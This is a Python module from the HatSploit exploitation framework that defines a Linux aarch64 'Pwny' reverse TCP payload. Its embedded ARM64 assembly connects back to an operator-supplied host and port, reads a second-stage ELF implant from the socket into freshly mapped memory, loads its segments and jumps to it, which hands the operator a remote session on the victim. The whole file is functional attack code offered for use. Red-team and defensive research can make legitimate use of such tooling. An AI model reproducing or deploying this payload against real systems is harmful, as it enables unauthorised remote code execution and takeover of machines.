"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny import Pwny
from pwny.session import PwnySession

from pex.assembler import Assembler

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload, Handler, Pwny, Assembler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Linux aarch64 Pwny Reverse TCP",
            'Payload': "linux/aarch64/pwny_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Description': "Linux aarch64 (arm64) Pwny Reverse TCP",
            'Arch': ARCH_AARCH64,
            'Platform': OS_LINUX,
            'Session': PwnySession,
            'Rank': "high",
            'Type': "reverse_tcp"
        }

    def implant(self):
        implant = self.get_implant(
            platform=self.details['Platform'],
            arch=self.details['Arch']
        )

        length = len(implant)

        return self.assemble(
            self.details['Arch'],
            f"""
            setup:
                ldr x2, ={hex(length)}
                mov x10, x2

                lsr x2, x2, 0xc
                add x2, x2, 1
                lsl x2, x2, 0xc

                mov x0, xzr
                mov x1, x2
                mov x2, 6
                mov x3, 0x22
                mov x4, xzr
                mov x5, xzr
                mov x8, 0xde
                svc 0

                mov x4, x10
                mov x3, x0
                mov x10, x0

            read:
                mov x0, x12
                mov x1, x3
                mov x2, x4
                mov x8, 0x3f
                svc 0

                cbz w0, fail
                add x3, x3, x0
                subs x4, x4, x0
                bne read

            sanity:
                mov x0, x10
                ldr x1, [x0]
                mov x2, 0x457f
                movk x2, 0x464c, lsl 0x10
                cmp w1, w2
                bne fail

            headers:
                add x1, x0, 0x20
                ldr x1, [x1]
                add x1, x1, x0
                add x2, x0, 0x36
                ldrh w2, [x2]
                add x3, x0, 0x38
                ldrh w3, [x3]

            load_all:
                stp x0, x1, [sp, -0x10]!
                stp x2, x3, [sp, -0x10]!
                bl load_one
                ldp x2, x3, [sp], 0x10
                ldp x0, x1, [sp], 0x10

                add x1, x1, x2
                subs x3, x3, 1
                bne load_all

                add x1, x0, 0x18
                ldr x1, [x1]
                mov x8, x1

            stack:
                eor x0, x0, x0
                eor x1, x1, x1
                stp x0, x1, [sp, -0x10]!
                mov x2, 0x19
                mov x3, sp
                stp x2, x3, [sp, -0x10]!

                stp x0, x1, [sp, -0x10]!
                mov x2, 1
                mov x3, sp
                stp x2, x3, [sp, -0x10]!

                ldr x3, [sp, 8]
                mov x1, x12
                str x1, [x3]

                br x8

            load_one:
                stp x29, x30, [sp, -0x10]!
                mov x29, sp
                add x2, x1, 0
                ldr x2, [x2]
                uxth w2, w2
                cmp x2, 1
                bne next_phdr

                add x2, x1, 0x10
                ldr x2, [x2]

                add x3, x1, 0x28
                ldr x3, [x3]
                lsr w3, w3, 0xc
                add x3, x3, 1

            brk:
                lsl w3, w3, 0x10
                stp x0, x1, [sp, -0x10]!
                stp x2, x3, [sp, -0x10]!
                lsr w2, w2, 0xc
                lsl w2, w2, 0xc

                mov	x0, x2
                mov	x1, x3
                mov	x2, 7
                mov x3, 0x22
                mov x4, xzr
                mov x5, xzr
                mov x8, 0xde
                svc 0

                ldp x2, x3, [sp], 0x10
                ldp x0, x1, [sp], 0x10

                add x4, x1, 8
                ldr x4, [x4]
                add x4, x4, x0
                add x5, x1, 0x20
                ldr x5, [x5]

                stp x0, x1, [sp, -0x10]!
                stp x2, x3, [sp, -0x10]!
                stp x4, x5, [sp, -0x10]!
                mov	x0, x2
                mov	x1, x4
                mov	x2, x5

            memcpy:
                ldrb w3, [x1], 1
                strb w3, [x0], 1
                subs x2, x2, 1
                bge memcpy

                ldp x4, x5, [sp], 0x10
                ldp x2, x3, [sp], 0x10
                ldp x0, x1, [sp], 0x10

            next_phdr:
                mov sp, x29
                ldp x29, x30, [sp], 0x10
                ret

            fail:
                mov x0, 1
                mov x8, 0x5d
                svc 0
            """
        )

    def run(self):
        return self.assemble(
            self.details['Arch'],
            f"""
            bl start

            addr:
                .short 0x2
                .short 0x{self.rport.little.hex()}
                .word 0x{self.rhost.little.hex()}

            start:
                mov x0, 0x2
                mov x1, 0x1
                mov x2, 0
                mov x8, 0xc6
                svc 0
                mov x12, x0

                adr x1, addr
                mov x2, 0x10
                mov x8, 0xcb
                svc 0
            """
        ) + self.implant()
